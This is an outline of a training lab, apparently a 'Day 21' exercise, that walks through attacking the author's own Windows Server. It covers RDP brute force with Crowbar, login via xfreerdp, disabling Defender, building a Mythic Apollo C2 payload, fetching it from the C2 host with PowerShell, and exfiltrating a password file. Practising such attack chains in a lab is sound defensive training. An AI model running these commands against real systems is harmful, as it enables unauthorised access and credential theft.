# Day 21: Mythic C2 Framework Challenge - Step-by-Step Outline

## 1. Initial Setup
1. Create a fake password file on the Windows Server
   - Path: C:\Users\Administrator\Documents\passwords.txt
   - Content: Winter2024!

2. Change Windows Server password
   - New password: Winter2024!
   - Modify Group Policy to allow simpler passwords

## 2. RDP Brute Force Attack
1. Prepare wordlist on Kali Linux
   - Use rockyou.txt as base
   - Add custom password (Winter2024!)

2. Install and use Crowbar for brute force attack
   - Command: `crowbar -b rdp -u administrator -C mydfir_wordlist.txt -s 149.248.59.41/32`

3. Successful login with xfreerdp
   - Command: `xfreerdp /u:administrator /p:Winter2024! /v:149.248.59.41:3389`

## 3. Post-Exploitation Discovery
1. Run discovery commands on Windows Server
   - whoami
   - ipconfig
   - net user
   - net group

## 4. Defense Evasion
1. Disable Windows Defender via GUI

## 5. Mythic C2 Setup
1. Install Apollo agent in Mythic
   - Command: `./mythic-cli install github https://github.com/MythicAgents/apollo`

2. Install HTTP C2 profile
   - Command: `./mythic-cli install github https://github.com/MythicC2Profiles/http`

3. Generate payload in Mythic web GUI
   - Agent: Apollo
   - C2 Profile: HTTP
   - Output: Windows executable
   - Callback host: http://[Mythic server IP]
   - Port: 80

4. Download and rename payload on Mythic server
   - New name: service_host_dstepro.exe

## 6. Payload Delivery and Execution
1. Set up Python HTTP server on Mythic server
   - Command: `python3 -m http.server 9999`

2. Download payload on Windows Server using PowerShell
   - Command: `Invoke-WebRequest -Uri "http://[Mythic server IP]:9999/service_host_dstepro.exe" -OutFile "C:\Users\Public\Downloads\service_host_stepro.exe"`

3. Execute payload on Windows Server

## 7. C2 Session Establishment
1. Verify C2 connection in Mythic web GUI
2. Run test commands (whoami, ipconfig) through Mythic interface

## 8. Data Exfiltration
1. Use Mythic to download the password file
   - Command: `download C:\Users\Administrator\Documents\passwords.txt`

2. Verify exfiltrated file contents in Mythic web GUI
